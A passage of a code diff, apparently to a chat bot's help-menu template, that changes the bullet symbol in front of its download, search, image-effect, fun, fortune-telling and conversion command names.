+│➣ ${prefix}𝚗𝚘𝚠𝚙𝚕𝚊𝚢𝚒𝚗𝚐𝚋𝚒𝚘𝚜𝚔𝚘𝚙
+│➣ ${prefix}𝚊𝚖𝚒𝚗𝚒𝚘
+│➣ ${prefix}𝚠𝚊𝚝𝚝𝚙𝚊𝚍
+│➣ ${prefix}𝚠𝚎𝚋𝚝𝚘𝚘𝚗𝚜
+│➣ ${prefix}𝚍𝚛𝚊𝚔𝚘𝚛
 ╰─────────────────╮
 ╭─────────────────╯
 │〘DOWNLOAD MENU〙
 ╰─────────────────╮
 ╭─────────────────╯
-│➳ ${prefix}𝚝𝚒𝚔𝚝𝚘𝚔𝚗𝚘𝚠𝚖 [𝚞𝚛𝚕]
-│➳ ${prefix}𝚝𝚒𝚔𝚝𝚘𝚔𝚠𝚖 [𝚞𝚛𝚕]
-│➳ ${prefix}𝚝𝚒𝚔𝚝𝚘𝚔𝚖𝚙3 [𝚞𝚛𝚕]
-│➳ ${prefix}𝚒𝚗𝚜𝚝𝚊𝚐𝚛𝚊𝚖 [𝚞𝚛𝚕]
-│➳ ${prefix}𝚝𝚠𝚒𝚝𝚝𝚎𝚛 [𝚞𝚛𝚕]
-│➳ ${prefix}𝚝𝚠𝚒𝚝𝚝𝚎𝚛𝚖𝚙3 [𝚞𝚛𝚕]
-│➳ ${prefix}𝚏𝚊𝚌𝚎𝚋𝚘𝚘𝚔 [𝚞𝚛𝚕]
-│➳ ${prefix}𝚙𝚒𝚗𝚝𝚎𝚛𝚎𝚜𝚝𝚍𝚕 [𝚞𝚛𝚕]
-│➳ ${prefix}𝚢𝚝𝚖𝚙3 [𝚞𝚛𝚕]
-│➳ ${prefix}𝚢𝚝𝚖𝚙4 [𝚞𝚛𝚕]
-│➳ ${prefix}𝚐𝚎𝚝𝚖𝚞𝚜𝚒𝚌 [𝚚𝚞𝚎𝚛𝚢]
-│➳ ${prefix}𝚐𝚎𝚝𝚟𝚒𝚍𝚎𝚘 [𝚚𝚞𝚎𝚛𝚢]
-│➳ ${prefix}𝚞𝚖𝚖𝚊 [𝚞𝚛𝚕]
-│➳ ${prefix}𝚓𝚘𝚘𝚡 [𝚚𝚞𝚎𝚛𝚢]
-│➳ ${prefix}𝚜𝚘𝚞𝚗𝚍𝚌𝚕𝚘𝚞𝚍 [𝚞𝚛𝚕]
+│➣ ${prefix}𝚝𝚒𝚔𝚝𝚘𝚔𝚗𝚘𝚠𝚖 [𝚞𝚛𝚕]
+│➣ ${prefix}𝚝𝚒𝚔𝚝𝚘𝚔𝚠𝚖 [𝚞𝚛𝚕]
+│➣ ${prefix}𝚝𝚒𝚔𝚝𝚘𝚔𝚖𝚙3 [𝚞𝚛𝚕]
+│➣ ${prefix}𝚒𝚗𝚜𝚝𝚊𝚐𝚛𝚊𝚖 [𝚞𝚛𝚕]
+│➣ ${prefix}𝚝𝚠𝚒𝚝𝚝𝚎𝚛 [𝚞𝚛𝚕]
+│➣ ${prefix}𝚝𝚠𝚒𝚝𝚝𝚎𝚛𝚖𝚙3 [𝚞𝚛𝚕]
+│➣ ${prefix}𝚏𝚊𝚌𝚎𝚋𝚘𝚘𝚔 [𝚞𝚛𝚕]
+│➣ ${prefix}𝚙𝚒𝚗𝚝𝚎𝚛𝚎𝚜𝚝𝚍𝚕 [𝚞𝚛𝚕]
+│➣ ${prefix}𝚢𝚝𝚖𝚙3 [𝚞𝚛𝚕]
+│➣ ${prefix}𝚢𝚝𝚖𝚙4 [𝚞𝚛𝚕]
+│➣ ${prefix}𝚐𝚎𝚝𝚖𝚞𝚜𝚒𝚌 [𝚚𝚞𝚎𝚛𝚢]
+│➣ ${prefix}𝚐𝚎𝚝𝚟𝚒𝚍𝚎𝚘 [𝚚𝚞𝚎𝚛𝚢]
+│➣ ${prefix}𝚞𝚖𝚖𝚊 [𝚞𝚛𝚕]
+│➣ ${prefix}𝚓𝚘𝚘𝚡 [𝚚𝚞𝚎𝚛𝚢]
+│➣ ${prefix}𝚜𝚘𝚞𝚗𝚍𝚌𝚕𝚘𝚞𝚍 [𝚞𝚛𝚕]
 ╰─────────────────╮
 ╭─────────────────╯
 │ 〘 SEARCH MENU 〙
 ╰─────────────────╮
 ╭─────────────────╯
-│➳ ${prefix}𝚙𝚕𝚊𝚢 [𝚚𝚞𝚎𝚛𝚢]
-│➳ ${prefix}𝚢𝚝𝚜 [𝚚𝚞𝚎𝚛𝚢]
-│➳ ${prefix}𝚐𝚘𝚘𝚐𝚕𝚎 [𝚚𝚞𝚎𝚛𝚢]
-│➳ ${prefix}𝚐𝚒𝚖𝚊𝚐𝚎 [𝚚𝚞𝚎𝚛𝚢]
-│➳ ${prefix}𝚙𝚒𝚗𝚝𝚎𝚛𝚎𝚜𝚝 [𝚚𝚞𝚎𝚛𝚢]
-│➳ ${prefix}𝚠𝚊𝚕𝚕𝚙𝚊𝚙𝚎𝚛 [𝚚𝚞𝚎𝚛𝚢]
-│➳ ${prefix}𝚠𝚒𝚔𝚒𝚖𝚎𝚍𝚒𝚊 [𝚚𝚞𝚎𝚛𝚢]
-│➳ ${prefix}𝚢𝚝𝚜𝚎𝚊𝚛𝚌𝚑 [𝚚𝚞𝚎𝚛𝚢]
-│➳ ${prefix}𝚛𝚒𝚗𝚐𝚝𝚘𝚗𝚎 [𝚚𝚞𝚎𝚛𝚢]
-│➳ ${prefix}𝚜𝚝𝚊𝚕𝚔 [𝚘𝚙𝚝𝚒𝚘𝚗] [𝚚𝚞𝚎𝚛𝚢]
+│➣ ${prefix}𝚙𝚕𝚊𝚢 [𝚚𝚞𝚎𝚛𝚢]
+│➣ ${prefix}𝚢𝚝𝚜 [𝚚𝚞𝚎𝚛𝚢]
+│➣ ${prefix}𝚐𝚘𝚘𝚐𝚕𝚎 [𝚚𝚞𝚎𝚛𝚢]
+│➣ ${prefix}𝚐𝚒𝚖𝚊𝚐𝚎 [𝚚𝚞𝚎𝚛𝚢]
+│➣ ${prefix}𝚙𝚒𝚗𝚝𝚎𝚛𝚎𝚜𝚝 [𝚚𝚞𝚎𝚛𝚢]
+│➣ ${prefix}𝚠𝚊𝚕𝚕𝚙𝚊𝚙𝚎𝚛 [𝚚𝚞𝚎𝚛𝚢]
+│➣ ${prefix}𝚠𝚒𝚔𝚒𝚖𝚎𝚍𝚒𝚊 [𝚚𝚞𝚎𝚛𝚢]
+│➣ ${prefix}𝚢𝚝𝚜𝚎𝚊𝚛𝚌𝚑 [𝚚𝚞𝚎𝚛𝚢]
+│➣ ${prefix}𝚛𝚒𝚗𝚐𝚝𝚘𝚗𝚎 [𝚚𝚞𝚎𝚛𝚢]
+│➣ ${prefix}𝚜𝚝𝚊𝚕𝚔 [𝚘𝚙𝚝𝚒𝚘𝚗] [𝚚𝚞𝚎𝚛𝚢]
 ╰─────────────────╮
 ╭─────────────────╯
 │ 〘 RANDOM MENU 〙
 ╰─────────────────╮
 ╭─────────────────╯
-│➳ ${prefix}𝚌𝚘𝚏𝚏𝚎
-│➳ ${prefix}𝚚𝚞𝚘𝚝𝚎𝚜𝚊𝚗𝚒𝚖𝚎
-│➳ ${prefix}𝚖𝚘𝚝𝚒𝚟𝚊𝚜𝚒
-│➳ ${prefix}𝚍𝚒𝚕𝚊𝚗𝚚𝚞𝚘𝚝𝚎
-│➳ ${prefix}𝚋𝚞𝚌𝚒𝚗𝚚𝚞𝚘𝚝𝚎
-│➳ ${prefix}𝚔𝚊𝚝𝚊𝚜𝚎𝚗𝚓𝚊
-│➳ ${prefix}𝚙𝚞𝚒𝚜𝚒
-│➳ ${prefix}𝚌𝚘𝚞𝚙𝚕𝚎
-│➳ ${prefix}𝚊𝚗𝚒𝚖𝚎
-│➳ ${prefix}𝚠𝚊𝚒𝚏𝚞
-│➳ ${prefix}𝚑𝚞𝚜𝚋𝚞
-│➳ ${prefix}𝚗𝚎𝚔𝚘
-│➳ ${prefix}𝚜𝚑𝚒𝚗𝚘𝚋𝚞
-│➳ ${prefix}𝚠𝚊𝚒𝚏𝚞𝚜 (𝚗𝚜𝚏𝚠)
-│➳ ${prefix}𝚗𝚎𝚔𝚘𝚜 (𝚗𝚜𝚏𝚠)
-│➳ ${prefix}𝚝𝚛𝚊𝚙 (𝚗𝚜𝚏𝚠)
-│➳ ${prefix}𝚋𝚕𝚘𝚠𝚓𝚘𝚋 (𝚗𝚜𝚏𝚠)
+│➣ ${prefix}𝚌𝚘𝚏𝚏𝚎
+│➣ ${prefix}𝚚𝚞𝚘𝚝𝚎𝚜𝚊𝚗𝚒𝚖𝚎
+│➣ ${prefix}𝚖𝚘𝚝𝚒𝚟𝚊𝚜𝚒
+│➣ ${prefix}𝚍𝚒𝚕𝚊𝚗𝚚𝚞𝚘𝚝𝚎
+│➣ ${prefix}𝚋𝚞𝚌𝚒𝚗𝚚𝚞𝚘𝚝𝚎
+│➣ ${prefix}𝚔𝚊𝚝𝚊𝚜𝚎𝚗𝚓𝚊
+│➣ ${prefix}𝚙𝚞𝚒𝚜𝚒
+│➣ ${prefix}𝚌𝚘𝚞𝚙𝚕𝚎
+│➣ ${prefix}𝚊𝚗𝚒𝚖𝚎
+│➣ ${prefix}𝚠𝚊𝚒𝚏𝚞
+│➣ ${prefix}𝚑𝚞𝚜𝚋𝚞
+│➣ ${prefix}𝚗𝚎𝚔𝚘
+│➣ ${prefix}𝚜𝚑𝚒𝚗𝚘𝚋𝚞
+│➣ ${prefix}𝚠𝚊𝚒𝚏𝚞𝚜 (𝚗𝚜𝚏𝚠)
+│➣ ${prefix}𝚗𝚎𝚔𝚘𝚜 (𝚗𝚜𝚏𝚠)
+│➣ ${prefix}𝚝𝚛𝚊𝚙 (𝚗𝚜𝚏𝚠)
+│➣ ${prefix}𝚋𝚕𝚘𝚠𝚓𝚘𝚋 (𝚗𝚜𝚏𝚠)
 ╰─────────────────╮
 ╭─────────────────╯
 │ 〘 TEKS PRO MENU 〙
 ╰─────────────────╮
 ╭─────────────────╯
-│➳ ${prefix}3𝚍𝚌𝚑𝚛𝚒𝚜𝚝𝚖𝚊𝚜
-│➳ ${prefix}3𝚍𝚍𝚎𝚎𝚙𝚜𝚎𝚊
-│➳ ${prefix}𝚊𝚖𝚎𝚛𝚒𝚌𝚊𝚗𝚏𝚕𝚊𝚐
-│➳ ${prefix}3𝚍𝚜𝚌𝚒𝚏𝚒
-│➳ ${prefix}3𝚍𝚛𝚊𝚒𝚗𝚋𝚘𝚠
-│➳ ${prefix}3𝚍𝚠𝚊𝚝𝚎𝚛𝚙𝚒𝚙𝚎
-│➳ ${prefix}𝚑𝚊𝚕𝚕𝚘𝚠𝚎𝚎𝚗𝚜𝚔𝚎𝚕𝚎𝚝𝚘𝚗
-│➳ ${prefix}𝚜𝚔𝚎𝚝𝚌𝚑
-│➳ ${prefix}𝚋𝚕𝚞𝚎𝚌𝚒𝚛𝚌𝚞𝚒𝚝
-│➳ ${prefix}𝚜𝚙𝚊𝚌𝚎
-│➳ ${prefix}𝚖𝚎𝚝𝚊𝚕𝚕𝚒𝚌
-│➳ ${prefix}𝚏𝚒𝚌𝚝𝚒𝚘𝚗
-│➳ ${prefix}𝚐𝚛𝚎𝚎𝚗𝚑𝚘𝚛𝚛𝚘𝚛
-│➳ ${prefix}𝚝𝚛𝚊𝚗𝚜𝚏𝚘𝚛𝚖𝚎𝚛
-│➳ ${prefix}𝚋𝚎𝚛𝚛𝚢
-│➳ ${prefix}𝚝𝚑𝚞𝚗𝚍𝚎𝚛
-│➳ ${prefix}𝚖𝚊𝚐𝚖𝚊
-│➳ ${prefix}3𝚍𝚌𝚛𝚊𝚌𝚔𝚎𝚍𝚜𝚝𝚘𝚗𝚎
-│➳ ${prefix}3𝚍𝚗𝚎𝚘𝚗𝚕𝚒𝚐𝚑𝚝
-│➳ ${prefix}𝚒𝚖𝚙𝚛𝚎𝚜𝚜𝚒𝚟𝚎𝚐𝚕𝚒𝚝𝚌𝚑
-│➳ ${prefix}𝚗𝚊𝚝𝚞𝚛𝚊𝚕𝚕𝚎𝚊𝚟𝚎𝚜
-│➳ ${prefix}𝚏𝚒𝚛𝚎𝚠𝚘𝚛𝚔𝚜𝚙𝚊𝚛𝚔𝚕𝚎
-│➳ ${prefix}𝚖𝚊𝚝𝚛𝚒𝚡
-│➳ ${prefix}𝚍𝚛𝚘𝚙𝚠𝚊𝚝𝚎𝚛
-│➳ ${prefix}𝚑𝚊𝚛𝚛𝚢𝚙𝚘𝚝𝚝𝚎𝚛
-│➳ ${prefix}𝚏𝚘𝚐𝚐𝚢𝚠𝚒𝚗𝚍𝚘𝚠
-│➳ ${prefix}𝚗𝚎𝚘𝚗𝚍𝚎𝚟𝚒𝚕𝚜
-│➳ ${prefix}𝚌𝚑𝚛𝚒𝚜𝚝𝚖𝚊𝚜𝚑𝚘𝚕𝚒𝚍𝚊𝚢
-│➳ ${prefix}3𝚍𝚐𝚛𝚊𝚍𝚒𝚎𝚗𝚝
-│➳ ${prefix}𝚋𝚕𝚊𝚌𝚔𝚙𝚒𝚗𝚔
-│➳ ${prefix}𝚐𝚕𝚞𝚎𝚝𝚎𝚡𝚝
+│➣ ${prefix}3𝚍𝚌𝚑𝚛𝚒𝚜𝚝𝚖𝚊𝚜
+│➣ ${prefix}3𝚍𝚍𝚎𝚎𝚙𝚜𝚎𝚊
+│➣ ${prefix}𝚊𝚖𝚎𝚛𝚒𝚌𝚊𝚗𝚏𝚕𝚊𝚐
+│➣ ${prefix}3𝚍𝚜𝚌𝚒𝚏𝚒
+│➣ ${prefix}3𝚍𝚛𝚊𝚒𝚗𝚋𝚘𝚠
+│➣ ${prefix}3𝚍𝚠𝚊𝚝𝚎𝚛𝚙𝚒𝚙𝚎
+│➣ ${prefix}𝚑𝚊𝚕𝚕𝚘𝚠𝚎𝚎𝚗𝚜𝚔𝚎𝚕𝚎𝚝𝚘𝚗
+│➣ ${prefix}𝚜𝚔𝚎𝚝𝚌𝚑
+│➣ ${prefix}𝚋𝚕𝚞𝚎𝚌𝚒𝚛𝚌𝚞𝚒𝚝
+│➣ ${prefix}𝚜𝚙𝚊𝚌𝚎
+│➣ ${prefix}𝚖𝚎𝚝𝚊𝚕𝚕𝚒𝚌
+│➣ ${prefix}𝚏𝚒𝚌𝚝𝚒𝚘𝚗
+│➣ ${prefix}𝚐𝚛𝚎𝚎𝚗𝚑𝚘𝚛𝚛𝚘𝚛
+│➣ ${prefix}𝚝𝚛𝚊𝚗𝚜𝚏𝚘𝚛𝚖𝚎𝚛
+│➣ ${prefix}𝚋𝚎𝚛𝚛𝚢
+│➣ ${prefix}𝚝𝚑𝚞𝚗𝚍𝚎𝚛
+│➣ ${prefix}𝚖𝚊𝚐𝚖𝚊
+│➣ ${prefix}3𝚍𝚌𝚛𝚊𝚌𝚔𝚎𝚍𝚜𝚝𝚘𝚗𝚎
+│➣ ${prefix}3𝚍𝚗𝚎𝚘𝚗𝚕𝚒𝚐𝚑𝚝
+│➣ ${prefix}𝚒𝚖𝚙𝚛𝚎𝚜𝚜𝚒𝚟𝚎𝚐𝚕𝚒𝚝𝚌𝚑
+│➣ ${prefix}𝚗𝚊𝚝𝚞𝚛𝚊𝚕𝚕𝚎𝚊𝚟𝚎𝚜
+│➣ ${prefix}𝚏𝚒𝚛𝚎𝚠𝚘𝚛𝚔𝚜𝚙𝚊𝚛𝚔𝚕𝚎
+│➣ ${prefix}𝚖𝚊𝚝𝚛𝚒𝚡
+│➣ ${prefix}𝚍𝚛𝚘𝚙𝚠𝚊𝚝𝚎𝚛
+│➣ ${prefix}𝚑𝚊𝚛𝚛𝚢𝚙𝚘𝚝𝚝𝚎𝚛
+│➣ ${prefix}𝚏𝚘𝚐𝚐𝚢𝚠𝚒𝚗𝚍𝚘𝚠
+│➣ ${prefix}𝚗𝚎𝚘𝚗𝚍𝚎𝚟𝚒𝚕𝚜
+│➣ ${prefix}𝚌𝚑𝚛𝚒𝚜𝚝𝚖𝚊𝚜𝚑𝚘𝚕𝚒𝚍𝚊𝚢
+│➣ ${prefix}3𝚍𝚐𝚛𝚊𝚍𝚒𝚎𝚗𝚝
+│➣ ${prefix}𝚋𝚕𝚊𝚌𝚔𝚙𝚒𝚗𝚔
+│➣ ${prefix}𝚐𝚕𝚞𝚎𝚝𝚎𝚡𝚝
 ╰─────────────────╮
 ╭─────────────────╯
 │〘PHOTO OXY MENU〙
 ╰─────────────────╮
 ╭─────────────────╯
-│➳ ${prefix}𝚜𝚑𝚊𝚍𝚘𝚠
-│➳ ${prefix}𝚛𝚘𝚖𝚊𝚗𝚝𝚒𝚌
-│➳ ${prefix}𝚜𝚖𝚘𝚔𝚎
-│➳ ${prefix}𝚋𝚞𝚛𝚗𝚙𝚊𝚙𝚙𝚎𝚛
-│➳ ${prefix}𝚗𝚊𝚛𝚞𝚝𝚘
-│➳ ${prefix}𝚕𝚘𝚟𝚎𝚖𝚜𝚐
-│➳ ${prefix}𝚐𝚛𝚊𝚜𝚜𝚖𝚜𝚐
-│➳ ${prefix}𝚕𝚘𝚟𝚎𝚝𝚎𝚡𝚝
-│➳ ${prefix}𝚌𝚘𝚏𝚏𝚎𝚌𝚞𝚙
-│➳ ${prefix}𝚋𝚞𝚝𝚝𝚎𝚛𝚏𝚕𝚢
-│➳ ${prefix}𝚑𝚊𝚛𝚛𝚢𝚙𝚘𝚝𝚝𝚎𝚛
-│➳ ${prefix}𝚛𝚎𝚝𝚛𝚘𝚕𝚘𝚕
+│➣ ${prefix}𝚜𝚑𝚊𝚍𝚘𝚠
+│➣ ${prefix}𝚛𝚘𝚖𝚊𝚗𝚝𝚒𝚌
+│➣ ${prefix}𝚜𝚖𝚘𝚔𝚎
+│➣ ${prefix}𝚋𝚞𝚛𝚗𝚙𝚊𝚙𝚙𝚎𝚛
+│➣ ${prefix}𝚗𝚊𝚛𝚞𝚝𝚘
+│➣ ${prefix}𝚕𝚘𝚟𝚎𝚖𝚜𝚐
+│➣ ${prefix}𝚐𝚛𝚊𝚜𝚜𝚖𝚜𝚐
+│➣ ${prefix}𝚕𝚘𝚟𝚎𝚝𝚎𝚡𝚝
+│➣ ${prefix}𝚌𝚘𝚏𝚏𝚎𝚌𝚞𝚙
+│➣ ${prefix}𝚋𝚞𝚝𝚝𝚎𝚛𝚏𝚕𝚢
+│➣ ${prefix}𝚑𝚊𝚛𝚛𝚢𝚙𝚘𝚝𝚝𝚎𝚛
+│➣ ${prefix}𝚛𝚎𝚝𝚛𝚘𝚕𝚘𝚕
 ╰─────────────────╮
 ╭─────────────────╯
 │ 〘 EPHOTO MENU 〙
 ╰─────────────────╮
 ╭─────────────────╯
-│➳ ${prefix}𝚏𝚏𝚌𝚘𝚟𝚎𝚛
-│➳ ${prefix}𝚌𝚛𝚘𝚜𝚜𝚏𝚒𝚛𝚎
-│➳ ${prefix}𝚐𝚊𝚕𝚊𝚡𝚢
-│➳ ${prefix}𝚐𝚕𝚊𝚜𝚜
-│➳ ${prefix}𝚗𝚎𝚘𝚗
-│➳ ${prefix}𝚋𝚎𝚊𝚌𝚑
-│➳ ${prefix}𝚋𝚕𝚊𝚌𝚔𝚙𝚒𝚗𝚔
-│➳ ${prefix}𝚒𝚐𝚌𝚎𝚛𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚎
-│➳ ${prefix}𝚢𝚝𝚌𝚎𝚛𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚎
+│➣ ${prefix}𝚏𝚏𝚌𝚘𝚟𝚎𝚛
+│➣ ${prefix}𝚌𝚛𝚘𝚜𝚜𝚏𝚒𝚛𝚎
+│➣ ${prefix}𝚐𝚊𝚕𝚊𝚡𝚢
+│➣ ${prefix}𝚐𝚕𝚊𝚜𝚜
+│➣ ${prefix}𝚗𝚎𝚘𝚗
+│➣ ${prefix}𝚋𝚎𝚊𝚌𝚑
+│➣ ${prefix}𝚋𝚕𝚊𝚌𝚔𝚙𝚒𝚗𝚔
+│➣ ${prefix}𝚒𝚐𝚌𝚎𝚛𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚎
+│➣ ${prefix}𝚢𝚝𝚌𝚎𝚛𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚎
 ╰─────────────────╮
 ╭─────────────────╯
 │    〘 FUN MENU 〙
 ╰─────────────────╮
 ╭─────────────────╯
-│➳ ${prefix}𝚜𝚒𝚖𝚒𝚑
-│➳ ${prefix}𝚑𝚊𝚕𝚊𝚑
-│➳ ${prefix}𝚑𝚒𝚕𝚒𝚑
-│➳ ${prefix}𝚑𝚞𝚕𝚞𝚑
-│➳ ${prefix}𝚑𝚎𝚕𝚎𝚑
-│➳ ${prefix}𝚑𝚘𝚕𝚘𝚑
-│➳ ${prefix}𝚓𝚊𝚍𝚒𝚊𝚗
-│➳ ${prefix}𝚓𝚘𝚍𝚘𝚑𝚔𝚞
-│➳ ${prefix}𝚍𝚎𝚕𝚝𝚝𝚝
-│➳ ${prefix}𝚝𝚒𝚌𝚝𝚊𝚌𝚝𝚘𝚎
-│➳ ${prefix}𝚏𝚊𝚖𝚒𝚕𝚢100
-│➳ ${prefix}𝚝𝚎𝚋𝚊𝚔 [𝚘𝚙𝚝𝚒𝚘𝚗]
-│➳ ${prefix}𝚖𝚊𝚝𝚑 [𝚖𝚘𝚍𝚎]
-│➳ ${prefix}𝚜𝚞𝚒𝚝𝚙𝚟𝚙 [@𝚝𝚊𝚐]
+│➣ ${prefix}𝚜𝚒𝚖𝚒𝚑
+│➣ ${prefix}𝚑𝚊𝚕𝚊𝚑
+│➣ ${prefix}𝚑𝚒𝚕𝚒𝚑
+│➣ ${prefix}𝚑𝚞𝚕𝚞𝚑
+│➣ ${prefix}𝚑𝚎𝚕𝚎𝚑
+│➣ ${prefix}𝚑𝚘𝚕𝚘𝚑
+│➣ ${prefix}𝚓𝚊𝚍𝚒𝚊𝚗
+│➣ ${prefix}𝚓𝚘𝚍𝚘𝚑𝚔𝚞
+│➣ ${prefix}𝚍𝚎𝚕𝚝𝚝𝚝
+│➣ ${prefix}𝚝𝚒𝚌𝚝𝚊𝚌𝚝𝚘𝚎
+│➣ ${prefix}𝚏𝚊𝚖𝚒𝚕𝚢100
+│➣ ${prefix}𝚝𝚎𝚋𝚊𝚔 [𝚘𝚙𝚝𝚒𝚘𝚗]
+│➣ ${prefix}𝚖𝚊𝚝𝚑 [𝚖𝚘𝚍𝚎]
+│➣ ${prefix}𝚜𝚞𝚒𝚝𝚙𝚟𝚙 [@𝚝𝚊𝚐]
 ╰─────────────────╮
 ╭─────────────────╯
 │ 〘 PRIMBON MENU 〙
 ╰─────────────────╮
 ╭─────────────────╯
-│➳ ${prefix}𝚗𝚘𝚖𝚘𝚛𝚑𝚘𝚔𝚒
-│➳ ${prefix}𝚊𝚛𝚝𝚒𝚖𝚒𝚖𝚙𝚒
-│➳ ${prefix}𝚊𝚛𝚝𝚒𝚗𝚊𝚖𝚊
-│➳ ${prefix}𝚛𝚊𝚖𝚊𝚕𝚓𝚘𝚍𝚘𝚑
-│➳ ${prefix}𝚛𝚊𝚖𝚊𝚕𝚓𝚘𝚍𝚘𝚑𝚋𝚊𝚕𝚒
-│➳ ${prefix}𝚜𝚞𝚊𝚖𝚒𝚒𝚜𝚝𝚛𝚒
-│➳ ${prefix}𝚛𝚊𝚖𝚊𝚕𝚌𝚒𝚗𝚝𝚊
-│➳ ${prefix}𝚌𝚘𝚌𝚘𝚔𝚗𝚊𝚖𝚊
-│➳ ${prefix}𝚙𝚊𝚜𝚊𝚗𝚐𝚊𝚗
-│➳ ${prefix}𝚓𝚊𝚍𝚒𝚊𝚗𝚗𝚒𝚔𝚊𝚑
-│➳ ${prefix}𝚜𝚒𝚏𝚊𝚝𝚞𝚜𝚊𝚑𝚊
-│➳ ${prefix}𝚛𝚎𝚣𝚎𝚔𝚒
-│➳ ${prefix}𝚙𝚎𝚔𝚎𝚛𝚓𝚊𝚊𝚗
-│➳ ${prefix}𝚗𝚊𝚜𝚒𝚋
-│➳ ${prefix}𝚙𝚎𝚗𝚢𝚊𝚔𝚒𝚝
-│➳ ${prefix}𝚝𝚊𝚛𝚘𝚝
-│➳ ${prefix}𝚏𝚎𝚗𝚐𝚜𝚑𝚞𝚒
-│➳ ${prefix}𝚑𝚊𝚛𝚒𝚋𝚊𝚒𝚔
-│➳ ${prefix}𝚑𝚊𝚛𝚒𝚜𝚊𝚗𝚐𝚊𝚛
-│➳ ${prefix}𝚑𝚊𝚛𝚒𝚜𝚒𝚊𝚕
-│➳ ${prefix}𝚗𝚊𝚐𝚊𝚑𝚊𝚛𝚒
-│➳ ${prefix}𝚊𝚛𝚊𝚑𝚛𝚎𝚣𝚎𝚔𝚒
-│➳ ${prefix}𝚙𝚎𝚛𝚞𝚗𝚝𝚞𝚗𝚐𝚊𝚗
-│➳ ${prefix}𝚠𝚎𝚝𝚘𝚗
-│➳ ${prefix}𝚔𝚊𝚛𝚊𝚔𝚝𝚎𝚛
-│➳ ${prefix}𝚔𝚎𝚋𝚎𝚛𝚞𝚗𝚝𝚞𝚗𝚐𝚊𝚗
-│➳ ${prefix}𝚖𝚎𝚖𝚊𝚗𝚌𝚒𝚗𝚐
-│➳ ${prefix}𝚖𝚊𝚜𝚊𝚜𝚞𝚋𝚞𝚛
-│➳ ${prefix}𝚣𝚘𝚍𝚒𝚊𝚔
-│➳ ${prefix}𝚜𝚑𝚒𝚘
+│➣ ${prefix}𝚗𝚘𝚖𝚘𝚛𝚑𝚘𝚔𝚒
+│➣ ${prefix}𝚊𝚛𝚝𝚒𝚖𝚒𝚖𝚙𝚒
+│➣ ${prefix}𝚊𝚛𝚝𝚒𝚗𝚊𝚖𝚊
+│➣ ${prefix}𝚛𝚊𝚖𝚊𝚕𝚓𝚘𝚍𝚘𝚑
+│➣ ${prefix}𝚛𝚊𝚖𝚊𝚕𝚓𝚘𝚍𝚘𝚑𝚋𝚊𝚕𝚒
+│➣ ${prefix}𝚜𝚞𝚊𝚖𝚒𝚒𝚜𝚝𝚛𝚒
+│➣ ${prefix}𝚛𝚊𝚖𝚊𝚕𝚌𝚒𝚗𝚝𝚊
+│➣ ${prefix}𝚌𝚘𝚌𝚘𝚔𝚗𝚊𝚖𝚊
+│➣ ${prefix}𝚙𝚊𝚜𝚊𝚗𝚐𝚊𝚗
+│➣ ${prefix}𝚓𝚊𝚍𝚒𝚊𝚗𝚗𝚒𝚔𝚊𝚑
+│➣ ${prefix}𝚜𝚒𝚏𝚊𝚝𝚞𝚜𝚊𝚑𝚊
+│➣ ${prefix}𝚛𝚎𝚣𝚎𝚔𝚒
+│➣ ${prefix}𝚙𝚎𝚔𝚎𝚛𝚓𝚊𝚊𝚗
+│➣ ${prefix}𝚗𝚊𝚜𝚒𝚋
+│➣ ${prefix}𝚙𝚎𝚗𝚢𝚊𝚔𝚒𝚝
+│➣ ${prefix}𝚝𝚊𝚛𝚘𝚝
+│➣ ${prefix}𝚏𝚎𝚗𝚐𝚜𝚑𝚞𝚒
+│➣ ${prefix}𝚑𝚊𝚛𝚒𝚋𝚊𝚒𝚔
+│➣ ${prefix}𝚑𝚊𝚛𝚒𝚜𝚊𝚗𝚐𝚊𝚛
+│➣ ${prefix}𝚑𝚊𝚛𝚒𝚜𝚒𝚊𝚕
+│➣ ${prefix}𝚗𝚊𝚐𝚊𝚑𝚊𝚛𝚒
+│➣ ${prefix}𝚊𝚛𝚊𝚑𝚛𝚎𝚣𝚎𝚔𝚒
+│➣ ${prefix}𝚙𝚎𝚛𝚞𝚗𝚝𝚞𝚗𝚐𝚊𝚗
+│➣ ${prefix}𝚠𝚎𝚝𝚘𝚗
+│➣ ${prefix}𝚔𝚊𝚛𝚊𝚔𝚝𝚎𝚛
+│➣ ${prefix}𝚔𝚎𝚋𝚎𝚛𝚞𝚗𝚝𝚞𝚗𝚐𝚊𝚗
+│➣ ${prefix}𝚖𝚎𝚖𝚊𝚗𝚌𝚒𝚗𝚐
+│➣ ${prefix}𝚖𝚊𝚜𝚊𝚜𝚞𝚋𝚞𝚛
+│➣ ${prefix}𝚣𝚘𝚍𝚒𝚊𝚔
+│➣ ${prefix}𝚜𝚑𝚒𝚘
 ╰─────────────────╮
 ╭─────────────────╯
 │ 〘 CONVERT MENU 〙
 ╰─────────────────╮
 ╭─────────────────╯
-│➳ ${prefix}𝚊𝚝𝚝𝚙
-│➳ ${prefix}𝚝𝚝𝚙
-│➳ ${prefix}𝚝𝚘𝚒𝚖𝚊𝚐𝚎
-│➳ ${prefix}𝚛𝚎𝚖𝚘𝚟𝚎𝚋𝚐
-│➳ ${prefix}𝚜𝚝𝚒𝚌𝚔𝚎𝚛
-│➳ ${prefix}𝚎𝚖𝚘𝚓𝚒𝚖𝚒𝚡
-│➳ ${prefix}𝚎𝚖𝚘𝚓𝚒𝚖𝚒𝚡2
-│➳ ${prefix}𝚝𝚘𝚟𝚒𝚍𝚎𝚘
-│➳ ${prefix}𝚝𝚘𝚐𝚒𝚏
-│➳ ${prefix}𝚝𝚘𝚞𝚛𝚕
-│➳ ${prefix}𝚝𝚘𝚟𝚗
-│➳ ${prefix}𝚝𝚘𝚖𝚙3
-│➳ ${prefix}𝚝𝚘𝚊𝚞𝚍𝚒𝚘
-│➳ ${prefix}𝚎𝚋𝚒𝚗𝚊𝚛𝚢
-│➳ ${prefix}𝚍𝚋𝚒𝚗𝚊𝚛𝚢
-│➳ ${prefix}𝚜𝚝𝚢𝚕𝚎𝚝𝚎𝚡𝚝
-│➳ ${prefix}𝚜𝚖𝚎𝚖𝚎
+│➣ ${prefix}𝚊𝚝𝚝𝚙
+│➣ ${prefix}𝚝𝚝𝚙
+│➣ ${prefix}𝚝𝚘𝚒𝚖𝚊𝚐𝚎
+│➣ ${prefix}𝚛𝚎𝚖𝚘𝚟𝚎𝚋𝚐
